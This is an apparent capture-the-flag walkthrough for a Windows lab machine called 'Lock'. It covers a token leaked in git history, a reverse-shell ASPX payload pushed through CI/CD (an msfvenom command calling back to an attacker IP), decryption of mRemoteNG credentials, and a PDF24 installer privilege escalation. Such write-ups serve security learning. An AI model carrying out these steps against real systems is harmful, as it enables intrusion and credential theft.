# Lock (easy)

## port scan

![](lock\(easy\)/walkthrough\_20240409222405175.png)

## web discover

we have git leak

![](lock\(easy\)/walkthrough\_20240409220011696.png)

but return 403

## gitea discover

![](lock\(easy\)/walkthrough\_20240409222458302.png)

![](lock\(easy\)/walkthrough\_20240409222528749.png)

use `git log -p` to dump all diff. We found a token `43ce39bb0bd6bc489284f2905f033ca467a6362f`

![](lock\(easy\)/walkthrough\_20240409222840196.png)

worked !

![](lock\(easy\)/walkthrough\_20240409223316091.png)

## get a shell

we have website.git

![](lock\(easy\)/walkthrough\_20240409223425998.png)

we can use `git clone $token@$target_repo` format to clone repo

![](lock\(easy\)/walkthrough\_20240409223522140.png)

ci/cd is enable which mean we can change this repo and get shell via ci/cd

![](lock\(easy\)/walkthrough\_20240409224452657.png)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.1.167 LPORT=80 -f aspx -o shell.aspx
```

add shell.aspx to project directory

just push our evil code to remote repo

![](lock\(easy\)/walkthrough\_20240409224719558.png)

use curl command ang we get a shell!

```
git add .
git commit -m 'update shell console to dev'
git push -u origin main
```

![](lock\(easy\)/walkthrough\_20240409224833005.png)

### runas Gale.Dekarios

there have some creds

![](lock\(easy\)/walkthrough\_20240409225121860.png)

![](lock\(easy\)/walkthrough\_20240409225316514.png)

there have Gale.Dekarios user encrypt password in config.xml

![](lock\(easy\)/walkthrough\_20240409230829041.png)

so this is something called mRemoteNG

![](lock\(easy\)/walkthrough\_20240409230852799.png)

now we have plaintext password

![](lock\(easy\)/walkthrough\_20240409230248713.png)

we can use this password rdp into target

![](lock\(easy\)/walkthrough\_20240409230005611.png)

## Privilege Escalation

because there have a software called `PDF24`

google!

![](lock\(easy\)/walkthrough\_20240409231454409.png)

![](lock\(easy\)/walkthrough\_20240409231655957.png)

this exploit seems must use installed.msi. so we have to find a msi file called `pdf24-creator-11.14.0-x64.msi`

![](lock\(easy\)/walkthrough\_20240409231849001.png)

got it!

![](lock\(easy\)/walkthrough\_20240409231905319.png)

build tool

![](lock\(easy\)/walkthrough\_20240409232716293.png)

wait sometime

![](lock\(easy\)/walkthrough\_20240409234909290.png)

we have system cmd!

![](lock\(easy\)/walkthrough\_20240409233530701.png)

just follow the post, our target is open web browser

![](lock\(easy\)/walkthrough\_20240409233611214.png)

select legacy console model

![](lock\(easy\)/walkthrough\_20240409233630760.png)

don't select edge. seems edge can't run on this windows version. it doesn't pop up edge

![](lock\(easy\)/walkthrough\_20240409233719407.png)

we launch system firefox web browser

![](lock\(easy\)/walkthrough\_20240409235401600.png)

![](lock\(easy\)/walkthrough\_20240409235445495.png)

firefox open file `Ctrl + O`

![](lock\(easy\)/walkthrough\_20240409235615006.png)

![](lock\(easy\)/walkthrough\_20240409235641885.png)

we get system cmd shell !

![](lock\(easy\)/walkthrough\_20240409235658744.png)
